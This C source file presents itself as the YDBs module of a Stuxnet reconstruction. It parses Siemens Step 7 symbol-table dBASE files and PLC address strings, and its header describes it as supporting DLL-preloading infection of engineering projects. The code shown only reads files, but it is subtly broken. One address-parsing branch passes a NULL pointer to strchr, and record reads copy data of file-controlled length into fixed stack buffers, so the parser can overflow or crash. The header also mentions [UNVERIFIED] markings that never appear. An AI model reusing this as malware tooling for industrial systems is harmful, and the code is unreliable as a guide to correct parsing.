/*
 * This file handles the YDBs symbol database structure used by Siemens Step 7.
 * It is part of the Stuxnet project infection chain, specifically the
 * manipulation of symbol table files to facilitate DLL preloading.
 *
 * Based on research-virus/stuxnet (Christian Roggia)
 * and public Siemens Step 7 documentation.
 *
 * IMPORTANT: This implementation is derived from public reverse engineering
 * analysis and Siemens documentation. It does NOT claim to be a byte-exact
 * reconstruction of the original Stuxnet YDBs module binary. Functions
 * marked as [UNVERIFIED] are based on logical inference from the Step 7
 * file format and the role YDBs plays in the infection chain.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define YDBS_DIR                        L"YDBs"
#define SYMLISTS_DBF                    L"SYMLISTS.DBF"
#define SYMLISTS_MDX                    L"SYMLISTS.MDX"
#define SYMLIST_DBF                     L"SYMLIST.DBF"
#define SYMLIST_MDX                     L"SYMLIST.MDX"
#define YLNKLIST_DBF                    L"YLNKLIST.DBF"

#define YDBS_MAX_PATH                   260
#define YDBS_BUFFER_SIZE                4096
#define YDBS_MAX_SYMBOLS                1024

/* dBASE III/IV file header size */
#define DBF_HEADER_SIZE                 32
#define DBF_FIELD_DESCRIPTOR_SIZE       32
#define DBF_TERMINATOR                  0x0D

/* Siemens symbol table field names from SYMLIST.DBF */
#define FIELD_SKZ                       "_SKZ"      /* Symbol name */
#define FIELD_OPHIST                    "_OPHIST"   /* Address */
#define FIELD_COMMENT                   "_COMMENT"  /* Comment */
#define FIELD_DATATYPE                  "_DATATYPE" /* Data type */

/*
 * dBASE III/IV file header structure
 * Reference: Siemens Step 7 stores symbol tables as dBASE compatible files
 */
#pragma pack(push, 1)
typedef struct _DBF_HEADER {
    BYTE    bVersion;               /* 0x03 = dBASE III without memo */
    BYTE    bLastUpdateYY;          /* Last update year - 1900 */
    BYTE    bLastUpdateMM;          /* Last update month */
    BYTE    bLastUpdateDD;          /* Last update day */
    DWORD   dwRecordCount;          /* Number of records */
    WORD    wHeaderSize;            /* Header size in bytes */
    WORD    wRecordSize;            /* Record size in bytes */
    BYTE    bReserved[2];
    BYTE    bTransaction;
    BYTE    bEncryption;
    BYTE    bReserved2[12];
} DBF_HEADER, * PDBF_HEADER;

typedef struct _DBF_FIELD {
    CHAR    szName[11];             /* Field name (null-padded) */
    BYTE    bType;                  /* Field type: C=char, N=numeric, L=logical */
    DWORD   dwAddress;              /* Field data address (unused) */
    BYTE    bLength;                /* Field length */
    BYTE    bDecimals;              /* Decimal count */
    BYTE    bReserved[14];
} DBF_FIELD, * PDBF_FIELD;
#pragma pack(pop)

/*
 * Symbol entry parsed from SYMLIST.DBF
 */
typedef struct _SYMBOL_ENTRY {
    CHAR    szName[32];             /* Symbol name (_SKZ) */
    CHAR    szAddress[16];          /* Address (_OPHIST) */
    CHAR    szComment[64];          /* Comment (_COMMENT) */
    CHAR    szDataType[8];          /* Data type (_DATATYPE) */
    DWORD   dwBlockNumber;          /* Parsed block number from address */
    DWORD   dwOffset;               /* Parsed offset from address */
} SYMBOL_ENTRY, * PSYMBOL_ENTRY;

/*
 * Symbol list entry from SYMLISTS.DBF
 * Maps program folder ID to symbol table path
 */
typedef struct _SYMLIST_ENTRY {
    DWORD   dwID;                   /* Symbol list ID */
    DWORD   dwProgramFolderID;      /* Program folder ID */
    WCHAR   szDBPath[YDBS_MAX_PATH];/* Relative DBF path */
} SYMLIST_ENTRY, * PSYMLIST_ENTRY;

/*
 * Link entry from YLNKLIST.DBF
 * Links program folders to symbol object IDs (SOI)
 */
typedef struct _LINK_ENTRY {
    DWORD   dwSOI;                  /* Symbol object ID */
    DWORD   dwProgramFolderID;      /* Program folder ID */
    DWORD   dwLinkType;             /* Link type */
} LINK_ENTRY, * PLINK_ENTRY;

/*
 * YDBs module context
 */
typedef struct _YDBS_CONTEXT {
    DWORD   dwMagic;
    DWORD   dwVersion;
    BOOL    bInitialized;
    WCHAR   szProjectPath[YDBS_MAX_PATH];
    WCHAR   szYDbsPath[YDBS_MAX_PATH];
    WCHAR   szSymlistsDBF[YDBS_MAX_PATH];
    WCHAR   szSymlistsMDX[YDBS_MAX_PATH];
    WCHAR   szYlnklistDBF[YDBS_MAX_PATH];
    DWORD   dwSymbolCount;
    DWORD   dwSymlistCount;
    DWORD   dwLinkCount;
    CRITICAL_SECTION csLock;
} YDBS_CONTEXT, * PYDBS_CONTEXT;

static YDBS_CONTEXT g_YDbsCtx = {0};

/* Forward declarations */
static BOOL YDBs_ParseDBFHeader(PBYTE pData, DWORD dwSize, PDBF_HEADER pHeader);
static BOOL YDBs_ParseDBFFields(PBYTE pData, DWORD dwSize, PDBF_HEADER pHeader, PDBF_FIELD pFields, DWORD dwMaxFields, PDWORD pdwFieldCount);
static BOOL YDBs_ReadDBFRecord(PBYTE pData, DWORD dwSize, PDBF_HEADER pHeader, PDBF_FIELD pFields, DWORD dwFieldCount, DWORD dwRecordIndex, PVOID pRecord);
static DWORD YDBs_ParseAddress(LPCSTR szAddress, PDWORD pdwBlock, PDWORD pdwOffset);

DWORD YDBs_Initialize(VOID)
{
    if (g_YDbsCtx.dwMagic == STUXNET_MAGIC) {
        return 0;
    }

    ZeroMemory(&g_YDbsCtx, sizeof(YDBS_CONTEXT));
    InitializeCriticalSection(&g_YDbsCtx.csLock);
    g_YDbsCtx.dwMagic = STUXNET_MAGIC;
    g_YDbsCtx.dwVersion = STUXNET_VERSION;
    g_YDbsCtx.bInitialized = TRUE;

    return 0;
}

DWORD YDBs_Cleanup(VOID)
{
    if (g_YDbsCtx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    DeleteCriticalSection(&g_YDbsCtx.csLock);
    ZeroMemory(&g_YDbsCtx, sizeof(YDBS_CONTEXT));

    return 0;
}

DWORD YDBs_SetProjectPath(LPCWSTR lpProjectPath)
{
    if (!lpProjectPath) {
        return -1;
    }

    EnterCriticalSection(&g_YDbsCtx.csLock);

    wcscpy_s(g_YDbsCtx.szProjectPath, YDBS_MAX_PATH, lpProjectPath);
    wsprintfW(g_YDbsCtx.szYDbsPath, L"%s\\%s", lpProjectPath, YDBS_DIR);
    wsprintfW(g_YDbsCtx.szSymlistsDBF, L"%s\\%s", g_YDbsCtx.szYDbsPath, SYMLISTS_DBF);
    wsprintfW(g_YDbsCtx.szSymlistsMDX, L"%s\\%s", g_YDbsCtx.szYDbsPath, SYMLISTS_MDX);
    wsprintfW(g_YDbsCtx.szYlnklistDBF, L"%s\\%s", g_YDbsCtx.szYDbsPath, YLNKLIST_DBF);

    LeaveCriticalSection(&g_YDbsCtx.csLock);

    return 0;
}

/*
 * Parses the dBASE file header
 * Reference: dBASE III/IV file format specification
 */
static BOOL YDBs_ParseDBFHeader(PBYTE pData, DWORD dwSize, PDBF_HEADER pHeader)
{
    if (!pData || dwSize < DBF_HEADER_SIZE || !pHeader) {
        return FALSE;
    }

    memcpy(pHeader, pData, sizeof(DBF_HEADER));

    /* Validate dBASE version (0x03 = dBASE III, 0x83 = dBASE III with memo) */
    if (pHeader->bVersion != 0x03 && pHeader->bVersion != 0x83 &&
        pHeader->bVersion != 0x04 && pHeader->bVersion != 0x05) {
        return FALSE;
    }

    /* Validate header size */
    if (pHeader->wHeaderSize < DBF_HEADER_SIZE || pHeader->wHeaderSize > dwSize) {
        return FALSE;
    }

    /* Validate record size */
    if (pHeader->wRecordSize == 0) {
        return FALSE;
    }

    return TRUE;
}

/*
 * Parses dBASE field descriptors
 * Each field descriptor is 32 bytes, terminated by 0x0D
 */
static BOOL YDBs_ParseDBFFields(PBYTE pData, DWORD dwSize, PDBF_HEADER pHeader,
                                 PDBF_FIELD pFields, DWORD dwMaxFields,
                                 PDWORD pdwFieldCount)
{
    DWORD dwOffset;
    DWORD dwFieldCount = 0;
    PDBF_FIELD pField;

    if (!pData || !pHeader || !pFields || !pdwFieldCount) {
        return FALSE;
    }

    dwOffset = DBF_HEADER_SIZE;

    while (dwOffset + DBF_FIELD_DESCRIPTOR_SIZE <= pHeader->wHeaderSize &&
           dwFieldCount < dwMaxFields) {

        /* Check for terminator */
        if (pData[dwOffset] == DBF_TERMINATOR) {
            break;
        }

        pField = &pFields[dwFieldCount];
        memcpy(pField, pData + dwOffset, DBF_FIELD_DESCRIPTOR_SIZE);

        /* Null-terminate field name */
        pField->szName[10] = '\0';

        dwOffset += DBF_FIELD_DESCRIPTOR_SIZE;
        dwFieldCount++;
    }

    *pdwFieldCount = dwFieldCount;
    return (dwFieldCount > 0);
}

/*
 * Reads a single record from the DBF file
 * Record data starts after the header and field descriptors
 */
static BOOL YDBs_ReadDBFRecord(PBYTE pData, DWORD dwSize, PDBF_HEADER pHeader,
                                PDBF_FIELD pFields, DWORD dwFieldCount,
                                DWORD dwRecordIndex, PVOID pRecord)
{
    DWORD dwRecordOffset;
    DWORD dwFieldOffset;
    DWORD i;

    if (!pData || !pHeader || !pFields || !pRecord) {
        return FALSE;
    }

    if (dwRecordIndex >= pHeader->dwRecordCount) {
        return FALSE;
    }

    /* Calculate record offset: header + records before this one */
    dwRecordOffset = pHeader->wHeaderSize + (dwRecordIndex * pHeader->wRecordSize);

    if (dwRecordOffset + pHeader->wRecordSize > dwSize) {
        return FALSE;
    }

    /* First byte of record is deletion flag (0x20 = active, 0x2A = deleted) */
    if (pData[dwRecordOffset] == 0x2A) {
        return FALSE; /* Record is deleted */
    }

    dwFieldOffset = dwRecordOffset + 1; /* Skip deletion flag */

    /* Copy field data to output record */
    for (i = 0; i < dwFieldCount; i++) {
        if (dwFieldOffset + pFields[i].bLength > dwSize) {
            break;
        }

        /* Field data starts at current offset */
        memcpy((PBYTE)pRecord + dwFieldOffset - (dwRecordOffset + 1),
               pData + dwFieldOffset, pFields[i].bLength);

        dwFieldOffset += pFields[i].bLength;
    }

    return TRUE;
}

/*
 * Parses a Siemens symbol address string into block number and offset
 *
 * Address format examples:
 *   DB1.DBW0    -> DB 1, word offset 0
 *   M0.0        -> Memory bit 0.0
 *   I0.0        -> Input bit 0.0
 *   Q0.0        -> Output bit 0.0
 *   T1          -> Timer 1
 *   C1          -> Counter 1
 *   FB1         -> Function block 1
 *   FC1         -> Function 1
 */
static DWORD YDBs_ParseAddress(LPCSTR szAddress, PDWORD pdwBlock, PDWORD pdwOffset)
{
    CHAR szUpper[32];
    DWORD i;
    LPCSTR p;

    if (!szAddress || !pdwBlock || !pdwOffset) {
        return 0;
    }

    /* Convert to uppercase */
    for (i = 0; i < 31 && szAddress[i]; i++) {
        szUpper[i] = (CHAR)toupper(szAddress[i]);
    }
    szUpper[i] = '\0';

    *pdwBlock = 0;
    *pdwOffset = 0;

    /* Data block (DB) */
    if (strncmp(szUpper, "DB", 2) == 0) {
        p = szUpper + 2;
        *pdwBlock = (DWORD)atoi(p);

        /* Find offset after '.' */
        p = strchr(p, '.');
        if (p) {
            p = strchr(p, 'W'); /* Word address */
            if (!p) p = strchr(p, 'D'); /* DWord address */
            if (!p) p = strchr(p, 'B'); /* Byte address */
            if (p) {
                *pdwOffset = (DWORD)atoi(p + 1);
            }
        }
        return 1;
    }

    /* Memory (M) */
    if (szUpper[0] == 'M') {
        *pdwBlock = 0x1000;
        p = strchr(szUpper, '.');
        if (p) {
            *pdwOffset = (DWORD)atoi(szUpper + 1) * 8 + (DWORD)atoi(p + 1);
        } else {
            *pdwOffset = (DWORD)atoi(szUpper + 1);
        }
        return 2;
    }

    /* Input (I) */
    if (szUpper[0] == 'I') {
        *pdwBlock = 0x2000;
        p = strchr(szUpper, '.');
        if (p) {
            *pdwOffset = (DWORD)atoi(szUpper + 1) * 8 + (DWORD)atoi(p + 1);
        }
        return 3;
    }

    /* Output (Q) */
    if (szUpper[0] == 'Q') {
        *pdwBlock = 0x3000;
        p = strchr(szUpper, '.');
        if (p) {
            *pdwOffset = (DWORD)atoi(szUpper + 1) * 8 + (DWORD)atoi(p + 1);
        }
        return 4;
    }

    /* Timer (T) */
    if (szUpper[0] == 'T') {
        *pdwBlock = 0x4000;
        *pdwOffset = (DWORD)atoi(szUpper + 1);
        return 5;
    }

    /* Counter (C) */
    if (szUpper[0] == 'C') {
        *pdwBlock = 0x5000;
        *pdwOffset = (DWORD)atoi(szUpper + 1);
        return 6;
    }

    /* Function Block (FB) */
    if (strncmp(szUpper, "FB", 2) == 0) {
        *pdwBlock = 0x6000;
        *pdwOffset = (DWORD)atoi(szUpper + 2);
        return 7;
    }

    /* Function (FC) */
    if (strncmp(szUpper, "FC", 2) == 0) {
        *pdwBlock = 0x7000;
        *pdwOffset = (DWORD)atoi(szUpper + 2);
        return 8;
    }

    return 0;
}

/*
 * Reads the SYMLISTS.DBF file
 * SYMLISTS.DBF contains a list of symbol tables and their program folder IDs
 *
 * The access chain is: S7RESOFF -> YLNKLIST -> SYMLISTS -> SYMLIST
 */
DWORD YDBs_ReadSymlistsDBF(PSYMLIST_ENTRY pEntries, DWORD dwMaxEntries, PDWORD pdwCount)
{
    HANDLE hFile;
    DWORD dwSize, dwRead;
    PBYTE pData;
    DBF_HEADER header;
    DBF_FIELD fields[16];
    DWORD dwFieldCount;
    DWORD i;
    DWORD dwCount = 0;

    if (!pEntries || dwMaxEntries == 0 || !pdwCount) {
        return -1;
    }

    EnterCriticalSection(&g_YDbsCtx.csLock);

    hFile = CreateFileW(g_YDbsCtx.szSymlistsDBF, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > YDBS_BUFFER_SIZE * 16) {
        CloseHandle(hFile);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    if (!YDBs_ParseDBFHeader(pData, dwRead, &header)) {
        HeapFree(GetProcessHeap(), 0, pData);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    if (!YDBs_ParseDBFFields(pData, dwRead, &header, fields, 16, &dwFieldCount)) {
        HeapFree(GetProcessHeap(), 0, pData);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    for (i = 0; i < header.dwRecordCount && dwCount < dwMaxEntries; i++) {
        BYTE record[256] = {0};
        DWORD j;
        DWORD dwFieldOffset = 1; /* Skip deletion flag */

        if (!YDBs_ReadDBFRecord(pData, dwRead, &header, fields, dwFieldCount, i, record)) {
            continue;
        }

        for (j = 0; j < dwFieldCount; j++) {
            LPCSTR szFieldData = (LPCSTR)(record + dwFieldOffset - 1);

            if (_stricmp(fields[j].szName, "ID") == 0) {
                pEntries[dwCount].dwID = (DWORD)atoi(szFieldData);
            } else if (_stricmp(fields[j].szName, "PROGRAMFOLDERID") == 0) {
                pEntries[dwCount].dwProgramFolderID = (DWORD)atoi(szFieldData);
            } else if (_stricmp(fields[j].szName, "DBPATH") == 0) {
                MultiByteToWideChar(CP_ACP, 0, szFieldData, -1,
                                    pEntries[dwCount].szDBPath, YDBS_MAX_PATH);
            }

            dwFieldOffset += fields[j].bLength;
        }

        dwCount++;
    }

    *pdwCount = dwCount;
    g_YDbsCtx.dwSymlistCount = dwCount;

    HeapFree(GetProcessHeap(), 0, pData);
    LeaveCriticalSection(&g_YDbsCtx.csLock);

    return 0;
}

/*
 * Reads the YLNKLIST.DBF file
 * YLNKLIST.DBF links program folders to symbol object IDs (SOI)
 */
DWORD YDBs_ReadYlnklistDBF(PLINK_ENTRY pEntries, DWORD dwMaxEntries, PDWORD pdwCount)
{
    HANDLE hFile;
    DWORD dwSize, dwRead;
    PBYTE pData;
    DBF_HEADER header;
    DBF_FIELD fields[16];
    DWORD dwFieldCount;
    DWORD i;
    DWORD dwCount = 0;

    if (!pEntries || dwMaxEntries == 0 || !pdwCount) {
        return -1;
    }

    EnterCriticalSection(&g_YDbsCtx.csLock);

    hFile = CreateFileW(g_YDbsCtx.szYlnklistDBF, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > YDBS_BUFFER_SIZE * 16) {
        CloseHandle(hFile);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    if (!YDBs_ParseDBFHeader(pData, dwRead, &header) ||
        !YDBs_ParseDBFFields(pData, dwRead, &header, fields, 16, &dwFieldCount)) {
        HeapFree(GetProcessHeap(), 0, pData);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    for (i = 0; i < header.dwRecordCount && dwCount < dwMaxEntries; i++) {
        BYTE record[256] = {0};
        DWORD j;
        DWORD dwFieldOffset = 1;

        if (!YDBs_ReadDBFRecord(pData, dwRead, &header, fields, dwFieldCount, i, record)) {
            continue;
        }

        for (j = 0; j < dwFieldCount; j++) {
            LPCSTR szFieldData = (LPCSTR)(record + dwFieldOffset - 1);

            if (_stricmp(fields[j].szName, "SOI") == 0) {
                pEntries[dwCount].dwSOI = (DWORD)atoi(szFieldData);
            } else if (_stricmp(fields[j].szName, "PROGRAMFOLDERID") == 0) {
                pEntries[dwCount].dwProgramFolderID = (DWORD)atoi(szFieldData);
            } else if (_stricmp(fields[j].szName, "LINKTYPE") == 0) {
                pEntries[dwCount].dwLinkType = (DWORD)atoi(szFieldData);
            }

            dwFieldOffset += fields[j].bLength;
        }

        dwCount++;
    }

    *pdwCount = dwCount;
    g_YDbsCtx.dwLinkCount = dwCount;

    HeapFree(GetProcessHeap(), 0, pData);
    LeaveCriticalSection(&g_YDbsCtx.csLock);

    return 0;
}

/*
 * Finds a symbol list path by program folder ID
 *
 * Access chain: programFolderID -> SYMLISTS -> SYMLIST.DBF path
 */
DWORD YDBs_FindSymbolList(DWORD dwProgramFolderID, LPWSTR lpSymbolListPath, DWORD dwPathSize)
{
    SYMLIST_ENTRY entries[64];
    DWORD dwCount = 0;
    DWORD i;

    if (!lpSymbolListPath || dwPathSize == 0) {
        return -1;
    }

    if (YDBs_ReadSymlistsDBF(entries, 64, &dwCount) != 0) {
        return -1;
    }

    for (i = 0; i < dwCount; i++) {
        if (entries[i].dwProgramFolderID == dwProgramFolderID) {
            wsprintfW(lpSymbolListPath, L"%s\\%s\\%s",
                      g_YDbsCtx.szYDbsPath,
                      entries[i].szDBPath,
                      SYMLIST_DBF);
            return 0;
        }
    }

    return -1;
}

/*
 * Reads and parses SYMLIST.DBF for a given symbol list path
 *
 * SYMLIST.DBF contains the actual symbol data:
 *   _SKZ      = Symbol name
 *   _OPHIST   = Address
 *   _COMMENT  = Comment
 */
DWORD YDBs_ReadSymlistDBF(LPCWSTR lpSymlistPath, PSYMBOL_ENTRY pSymbols,
                           DWORD dwMaxSymbols, PDWORD pdwCount)
{
    HANDLE hFile;
    DWORD dwSize, dwRead;
    PBYTE pData;
    DBF_HEADER header;
    DBF_FIELD fields[32];
    DWORD dwFieldCount;
    DWORD i;
    DWORD dwCount = 0;

    if (!lpSymlistPath || !pSymbols || dwMaxSymbols == 0 || !pdwCount) {
        return -1;
    }

    EnterCriticalSection(&g_YDbsCtx.csLock);

    hFile = CreateFileW(lpSymlistPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > YDBS_BUFFER_SIZE * 64) {
        CloseHandle(hFile);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    if (!YDBs_ParseDBFHeader(pData, dwRead, &header) ||
        !YDBs_ParseDBFFields(pData, dwRead, &header, fields, 32, &dwFieldCount)) {
        HeapFree(GetProcessHeap(), 0, pData);
        LeaveCriticalSection(&g_YDbsCtx.csLock);
        return -1;
    }

    for (i = 0; i < header.dwRecordCount && dwCount < dwMaxSymbols; i++) {
        BYTE record[512] = {0};
        DWORD j;
        DWORD dwFieldOffset = 1;

        if (!YDBs_ReadDBFRecord(pData, dwRead, &header, fields, dwFieldCount, i, record)) {
            continue;
        }

        ZeroMemory(&pSymbols[dwCount], sizeof(SYMBOL_ENTRY));

        for (j = 0; j < dwFieldCount; j++) {
            LPCSTR szFieldData = (LPCSTR)(record + dwFieldOffset - 1);
            DWORD dwFieldLen = fields[j].bLength;

            if (_stricmp(fields[j].szName, FIELD_SKZ) == 0) {
                strncpy_s(pSymbols[dwCount].szName, 32, szFieldData,
                          min(dwFieldLen, 31));
                /* Trim trailing spaces */
                for (int k = (int)strlen(pSymbols[dwCount].szName) - 1;
                     k >= 0 && pSymbols[dwCount].szName[k] == ' '; k--) {
                    pSymbols[dwCount].szName[k] = '\0';
                }
            } else if (_stricmp(fields[j].szName, FIELD_OPHIST) == 0) {
                strncpy_s(pSymbols[dwCount].szAddress, 16, szFieldData,
                          min(dwFieldLen, 15));
                for (int k = (int)strlen(pSymbols[dwCount].szAddress) - 1;
                     k >= 0 && pSymbols[dwCount].szAddress[k] == ' '; k--) {
                    pSymbols[dwCount].szAddress[k] = '\0';
                }
            } else if (_stricmp(fields[j].szName, FIELD_COMMENT) == 0) {
                strncpy_s(pSymbols[dwCount].szComment, 64, szFieldData,
                          min(dwFieldLen, 63));
                for (int k = (int)strlen(pSymbols[dwCount].szComment) - 1;
                     k >= 0 && pSymbols[dwCount].szComment[k] == ' '; k--) {
                    pSymbols[dwCount].szComment[k] = '\0';
                }
            } else if (_stricmp(fields[j].szName, FIELD_DATATYPE) == 0) {
                strncpy_s(pSymbols[dwCount].szDataType, 8, szFieldData,
                          min(dwFieldLen, 7));
            }

            dwFieldOffset += dwFieldLen;
        }

        /* Parse address into block number and offset */
        if (pSymbols[dwCount].szAddress[0]) {
            YDBs_ParseAddress(pSymbols[dwCount].szAddress,
                              &pSymbols[dwCount].dwBlockNumber,
                              &pSymbols[dwCount].dwOffset);
        }

        if (pSymbols[dwCount].szName[0]) {
            dwCount++;
        }
    }

    *pdwCount = dwCount;
    g_YDbsCtx.dwSymbolCount = dwCount;

    HeapFree(GetProcessHeap(), 0, pData);
    LeaveCriticalSection(&g_YDbsCtx.csLock);

    return 0;
}

/*
 * Finds a symbol by name in a symbol list
 */
DWORD YDBs_FindSymbol(LPCWSTR lpSymlistPath, LPCSTR szSymbolName,
                      PSYMBOL_ENTRY pSymbol)
{
    SYMBOL_ENTRY symbols[YDBS_MAX_SYMBOLS];
    DWORD dwCount = 0;
    DWORD i;

    if (!lpSymlistPath || !szSymbolName || !pSymbol) {
        return -1;
    }

    if (YDBs_ReadSymlistDBF(lpSymlistPath, symbols, YDBS_MAX_SYMBOLS, &dwCount) != 0) {
        return -1;
    }

    for (i = 0; i < dwCount; i++) {
        if (_stricmp(symbols[i].szName, szSymbolName) == 0) {
            memcpy(pSymbol, &symbols[i], sizeof(SYMBOL_ENTRY));
            return 0;
        }
    }

    return -1;
}

LPCWSTR YDBs_GetPath(VOID)
{
    return g_YDbsCtx.szYDbsPath;
}

LPCWSTR YDBs_GetSymlistsDBFPath(VOID)
{
    return g_YDbsCtx.szSymlistsDBF;
}

LPCWSTR YDBs_GetYlnklistDBFPath(VOID)
{
    return g_YDbsCtx.szYlnklistDBF;
}

DWORD YDBs_GetSymbolCount(VOID)
{
    return g_YDbsCtx.dwSymbolCount;
}

DWORD YDBs_GetSymlistCount(VOID)
{
    return g_YDbsCtx.dwSymlistCount;
}

DWORD YDBs_GetLinkCount(VOID)
{
    return g_YDbsCtx.dwLinkCount;
}

BOOL YDBs_IsPresent(VOID)
{
    DWORD dwAttrib;

    EnterCriticalSection(&g_YDbsCtx.csLock);
    dwAttrib = GetFileAttributesW(g_YDbsCtx.szYDbsPath);
    LeaveCriticalSection(&g_YDbsCtx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
            (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}